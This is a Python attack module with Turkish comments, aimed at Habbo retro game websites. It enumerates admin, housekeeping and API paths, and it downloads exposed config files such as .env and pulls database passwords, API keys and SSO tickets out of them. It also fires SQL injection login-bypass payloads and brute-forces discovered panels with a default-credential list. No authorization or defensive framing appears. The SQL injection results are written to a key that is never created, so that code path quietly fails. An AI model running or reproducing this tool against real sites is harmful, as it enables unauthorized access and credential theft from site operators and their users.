#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Admin Panel Bulucu ve Bilgi Toplama Modulu
Hedef Habbo retro sitesinde admin panellerini, acik API'leri
ve yapilandirma dosyalarini tespit eder.
"""

import re
import json
from typing import Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse
from datetime import datetime

from utils.network_utils import (
    fetch_url_content, get_http_headers, normalize_url,
    extract_domain, parallel_requests,
)
from utils.log_utils import Logger, LogManager


class AdminExtractor:
    """Hedef Habbo retro sitesinde admin panellerini ve bilgileri tespit eder."""

    ADMIN_PATHS = [
        "/admin", "/admin/", "/admin/index.php", "/admin/login.php",
        "/admincp", "/admincp/", "/admincp/index.php",
        "/administrator", "/administrator/",
        "/staff", "/staff/", "/staff/index.php",
        "/mod", "/mod/", "/mod/index.php",
        "/housekeeping", "/housekeeping/",
        "/housekeeping/index.php", "/housekeeping/login.php",
        "/hk", "/hk/", "/hk/index.php", "/hk/login.php",
        "/panel", "/panel/",
        "/dashboard", "/dashboard/",
        "/login", "/login/",
        "/api/admin", "/api/admin/",
        "/api/users", "/api/user",
        "/api/staff", "/api/staffs",
        "/api/me", "/api/profile",
        "/api/config", "/api/settings",
        "/api/status", "/api/health",
        "/api/ping", "/api/info",
        "/api/version",
        "/api/swagger", "/api/docs",
        "/api/graphql", "/graphql",
        "/.env", "/config.php",
        "/includes/config.php",
        "/database.php", "/db.php",
        "/phpmyadmin", "/phpmyadmin/",
        "/pma", "/pma/",
        "/info.php", "/phpinfo.php",
        "/robots.txt", "/sitemap.xml",
        "/crossdomain.xml", "/client.php",
        "/register", "/register/",
        "/me", "/home", "/home/",
        "/api/rank", "/api/ranks",
        "/api/permissions", "/api/rights",
        "/api/account", "/api/accounts",
        "/api/admin/users", "/api/admin/user",
        "/api/admin/staff", "/api/admin/staffs",
        "/api/admin/rank", "/api/admin/ranks",
        "/api/admin/config", "/api/admin/settings",
        "/api/admin/me", "/api/admin/profile",
        "/api/admin/account", "/api/admin/accounts",
        "/api/v1/users", "/api/v1/user",
        "/api/v1/staff", "/api/v1/staffs",
        "/api/v1/rank", "/api/v1/ranks",
        "/api/v1/config", "/api/v1/settings",
        "/api/v1/me", "/api/v1/profile",
        "/api/v1/account", "/api/v1/accounts",
        "/api/v1/admin/users", "/api/v1/admin/user",
        "/api/v1/admin/staff", "/api/v1/admin/staffs",
        "/api/v1/admin/rank", "/api/v1/admin/ranks",
        "/api/v1/admin/config", "/api/v1/admin/settings",
        "/api/v1/admin/me", "/api/v1/admin/profile",
        "/api/v1/admin/account", "/api/v1/admin/accounts",
        "/api/v2/users", "/api/v2/user",
        "/api/v2/staff", "/api/v2/staffs",
        "/api/v2/rank", "/api/v2/ranks",
        "/api/v2/config", "/api/v2/settings",
        "/api/v2/me", "/api/v2/profile",
        "/api/v2/account", "/api/v2/accounts",
        "/api/v2/admin/users", "/api/v2/admin/user",
        "/api/v2/admin/staff", "/api/v2/admin/staffs",
        "/api/v2/admin/rank", "/api/v2/admin/ranks",
        "/api/v2/admin/config", "/api/v2/admin/settings",
        "/api/v2/admin/me", "/api/v2/admin/profile",
        "/api/v2/admin/account", "/api/v2/admin/accounts",
        "/rcon", "/rcon/",
        "/mus", "/mus/",
        "/nitro", "/nitro/",
        "/client", "/client/",
        "/game", "/game/",
        "/gamedata", "/gamedata/",
        "/external_variables", "/external_variables/",
        "/external_texts", "/external_texts/",
        "/swf", "/swf/",
        "/cms/admin", "/cms/admin/",
        "/server-status", "/server-info",
    ]

    def __init__(self, target_url: str, logger: Optional[Logger] = None, gui_callback=None):
        self.target_url = normalize_url(target_url)
        self.domain = extract_domain(self.target_url)
        self.logger = logger or LogManager.get_logger()
        self.gui_callback = gui_callback
        self.results: Dict = {
            "target": self.target_url,
            "domain": self.domain,
            "admin_panels": [],
            "found_credentials": [],
            "config_files": [],
            "api_endpoints": [],
            "timestamp": datetime.now().isoformat(),
        }
        self._stop_flag = False

    def stop(self):
        self._stop_flag = True

    def _log(self, level: str, message: str) -> None:
        if level == "INFO":
            self.logger.info(message)
        elif level == "SUCCESS":
            self.logger.success(message)
        elif level == "WARNING":
            self.logger.warning(message)
        elif level == "ERROR":
            self.logger.error(message)
        if self.gui_callback:
            self.gui_callback(f"[{level}] {message}")

    def run(self, scan_admin=True, bruteforce=True, scan_configs=True, test_sqli=True, timeout=60) -> Dict:
        """Admin panel taramasini baslatir."""
        self._log("INFO", f"Admin panel taramasi basliyor: {self.domain}")
        self._log("INFO", f"Taranacak path sayisi: {len(self.ADMIN_PATHS)}")

        if scan_admin:
            self._scan_admin_panels(timeout)
        if scan_configs:
            self._scan_config_files(timeout)
        if test_sqli:
            self._test_sql_injection(timeout)
        if bruteforce and self.results["admin_panels"]:
            self._bruteforce_admin_panels(timeout)

        self._summarize()
        return self.results

    def _scan_admin_panels(self, timeout):
        """Admin panellerini hizli sekilde tarar."""
        self._log("INFO", "Admin panelleri taranıyor...")
        urls = [urljoin(self.target_url, path) for path in self.ADMIN_PATHS]

        # Hizli tarama - sadece basliklari kontrol et (HEAD istegi)
        found = 0
        for i, url in enumerate(urls):
            if self._stop_flag:
                break
            if i > 0 and i % 20 == 0:
                self._log("INFO", f"Taranan: {i}/{len(urls)} - Bulunan: {found}")

            try:
                import requests as req
                try:
                    r = req.head(url, timeout=min(5, timeout), allow_redirects=True,
                                 headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
                    if r.status_code < 400 or r.status_code == 403:
                        # Detayli kontrol icin GET yap
                        r2 = req.get(url, timeout=min(8, timeout), allow_redirects=True,
                                     headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
                        if r2.status_code < 400 or (r2.status_code == 403 and len(r2.text) > 100):
                            self.results["admin_panels"].append({
                                "url": url,
                                "status": r2.status_code,
                                "size": len(r2.text),
                            })
                            found += 1
                            self._log("SUCCESS", f"Panel bulundu: {url} (HTTP {r2.status_code})")
                except Exception:
                    continue
            except Exception:
                continue

        if not self.results["admin_panels"]:
            self._log("WARNING", "Admin paneli bulunamadi")
        else:
            self._log("SUCCESS", f"Toplam {len(self.results['admin_panels'])} panel bulundu")

    def _scan_config_files(self, timeout):
        """Yapilandirma dosyalarini ara."""
        self._log("INFO", "Config dosyalari taranıyor...")
        config_paths = [
            "/.env", "/config.php", "/configuration.php",
            "/includes/config.php", "/app/config.php",
            "/database.php", "/db.php", "/connect.php",
            "/settings.php", "/wp-config.php",
            "/config.json", "/config.yaml", "/config.yml",
            "/config.xml", "/config.ini",
            "/database.json", "/db.json",
            "/settings.json", "/env.json",
            "/.env.json", "/.env.example",
        ]
        urls = [urljoin(self.target_url, path) for path in config_paths]
        results = parallel_requests(urls, timeout=min(8, timeout), max_workers=15)
        for url, content, headers in results:
            if self._stop_flag:
                break
            if content and headers and len(content) > 10:
                self.results["config_files"].append({"url": url, "size": len(content)})
                self._log("SUCCESS", f"Config bulundu: {url} ({len(content)} bytes)")
                # Icerikte sifre/anahtar ara
                patterns = [
                    r'(?i)(DB_PASS|DB_PASSWORD|MYSQL_PASSWORD|password)["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                    r'(?i)(api[_-]?key|api[_-]?secret|secret[_-]?key)["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                    r'(?i)(mus[_-]?port|rcon[_-]?port)["\']?\s*[:=]\s*["\']?(\d+)["\']?',
                    r'(?i)(SSO|sso|ticket|auth_ticket)["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                ]
                for pattern in patterns:
                    matches = re.findall(pattern, content)
                    for match in matches:
                        key, value = match
                        self.results["found_credentials"].append({
                            "url": url, "key": key, "value": value, "source": "config_file",
                        })
                        self._log("SUCCESS", f"Config'de veri bulundu: {key} = {value[:50]}...")

        if not self.results["config_files"]:
            self._log("INFO", "Config dosyasi bulunamadi")

    def _test_sql_injection(self, timeout):
        """SQL injection testi yapar."""
        self._log("INFO", "SQL injection testi yapiliyor...")
        login_paths = [
            "/login", "/login/", "/login.php",
            "/admin", "/admin/", "/admin/index.php",
            "/admin/login.php", "/admincp", "/admincp/",
            "/housekeeping", "/housekeeping/",
            "/hk", "/hk/", "/hk/index.php", "/hk/login.php",
            "/staff", "/staff/",
            "/api/login", "/api/login/",
            "/api/auth", "/api/auth/",
            "/api/v1/login", "/api/v1/login/",
            "/api/v2/login", "/api/v2/login/",
        ]
        sqli_payloads = [
            "' OR '1'='1", "' OR '1'='1' --", "' OR 1=1 --",
            "admin' --", "admin' #",
        ]

        for path in login_paths:
            if self._stop_flag:
                break
            url = urljoin(self.target_url, path)
            for payload in sqli_payloads:
                try:
                    import requests as req
                    test_url = f"{url}?username={payload}&password={payload}"
                    r = req.get(test_url, timeout=min(5, timeout),
                                headers={"User-Agent": "Mozilla/5.0"})
                    content = r.text.lower()
                    if any(indicator in content for indicator in [
                        "sql", "mysql", "syntax error", "unclosed quotation",
                        "odbc", "driver", "warning: mysql",
                        "you have an error", "mysql_error", "mysqli_error",
                        "pdoexception", "sqlite",
                    ]):
                        self.results["sql_vulnerabilities"].append({
                            "url": url, "payload": payload, "type": "error_based",
                        })
                        self._log("SUCCESS", f"SQL injection bulundu: {url}")
                        break
                except Exception:
                    continue

    def _bruteforce_admin_panels(self, timeout):
        """Bulunan panellerde basit sifre denemesi."""
        self._log("INFO", "Panel giris denemeleri yapiliyor...")
        common_creds = [
            ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
            ("admin", "admin123"), ("admin", "letmein"), ("admin", "root"),
            ("admin", "toor"), ("admin", "administrator"),
            ("admin", "pass"), ("admin", "pass123"),
            ("staff", "staff"), ("staff", "password"), ("staff", "staff123"),
            ("mod", "mod"), ("mod", "mod123"), ("mod", "password"),
            ("owner", "owner"), ("owner", "password"),
            ("habbo", "habbo"), ("habbo", "password"), ("habbo", "habbo123"),
            ("root", "root"), ("root", "toor"), ("root", "password"),
            ("test", "test"), ("test", "test123"), ("test", "password"),
            ("admin", "admin1"), ("admin", "12345"), ("admin", "qwerty"),
            ("admin", "abc123"), ("admin", "111111"), ("admin", "123123"),
        ]

        for panel in self.results["admin_panels"][:5]:  # Ilk 5 paneli dene
            if self._stop_flag:
                break
            panel_url = panel["url"]
            for username, password in common_creds:
                try:
                    import requests as req
                    r = req.post(panel_url, data={"username": username, "password": password},
                                 timeout=min(5, timeout),
                                 headers={"User-Agent": "Mozilla/5.0"})
                    if r.status_code == 200 and len(r.text) > 100:
                        if "error" not in r.text.lower() and "invalid" not in r.text.lower():
                            self.results["found_credentials"].append({
                                "url": panel_url, "username": username, "password": password,
                                "source": "bruteforce",
                            })
                            self._log("SUCCESS", f"Giris basarili! {username}:{password} @ {panel_url}")
                            break
                except Exception:
                    continue

    def _summarize(self):
        self._log("INFO", "=== ADMIN EXTRACTOR SONUCLARI ===")
        if self.results["admin_panels"]:
            self._log("SUCCESS", f"Panel: {len(self.results['admin_panels'])} adet")
        if self.results["found_credentials"]:
            self._log("SUCCESS", f"Kredi: {len(self.results['found_credentials'])} adet")
        if self.results["config_files"]:
            self._log("SUCCESS", f"Config: {len(self.results['config_files'])} adet")
        if self.results.get("sql_vulnerabilities"):
            self._log("SUCCESS", f"SQL: {len(self.results['sql_vulnerabilities'])} adet")
        self._log("INFO", "=== ADMIN EXTRACTOR TAMAMLANDI ===")
